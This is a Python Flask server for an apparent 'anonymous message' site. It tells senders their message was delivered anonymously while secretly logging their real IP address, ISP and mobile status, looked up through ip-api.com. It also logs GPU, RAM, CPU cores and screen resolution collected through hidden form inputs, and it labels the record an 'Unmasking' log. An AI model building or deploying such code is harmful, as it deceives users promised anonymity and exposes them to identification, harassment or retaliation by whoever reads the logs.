from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import datetime
import requests

app = Flask(__name__)
# CORS allows your GitHub Pages site to send data to this Render server
CORS(app)

# The HTML shown after they hit 'Send'
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Message Sent</title>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #FE2F78; }
    </style>
</head>
<body>
    <div class="box">
        <h1>✅ Sent!</h1>
        <p>Your anonymous message was delivered.</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return "Backend is Running. Waiting for POST requests at /submit", 200

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # 1. Get the message text
        msg = request.form.get('message', 'No Message')

        # 2. Get IP and ISP (Server-Side)
        # Render uses a proxy, so we check 'X-Forwarded-For' for the real IP
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        isp_info = "Unknown ISP"
        try:
            # Quick lookup of the provider (Jio, Airtel, etc.)
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,mobile", timeout=5)
            data = response.json()
            isp_info = f"{data.get('isp')} | Mobile: {data.get('mobile')}"
        except:
            pass

        # 3. Get Hardware Specs (Client-Side from hidden inputs)
        gpu = request.form.get('gpu', 'Unknown GPU')
        res = request.form.get('res', 'Unknown Res')
        ram = request.form.get('ram', 'Unknown RAM')
        cores = request.form.get('cores', 'Unknown Cores')

        # 4. Format the "Unmasking" Log
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = (
            f"\n{'='*40}\n"
            f"🕒 TIME:    {timestamp}\n"
            f"💬 MESSAGE: {msg}\n"
            f"🌐 NETWORK: IP: {ip} | ISP: {isp_info}\n"
            f"💻 HARDWARE: GPU: {gpu} | RAM: {ram}GB | CPU: {cores} cores | RES: {res}\n"
            f"{'='*40}\n"
        )

        # 5. Print to Render Logs (This is where you see the data)
        print(log_entry)

        # 6. Return a nice success page to the user
        return render_template_string(SUCCESS_PAGE)

    except Exception as e:
        print(f"Error: {e}")
        return "Internal Server Error", 500

if __name__ == "__main__":
    app.run()
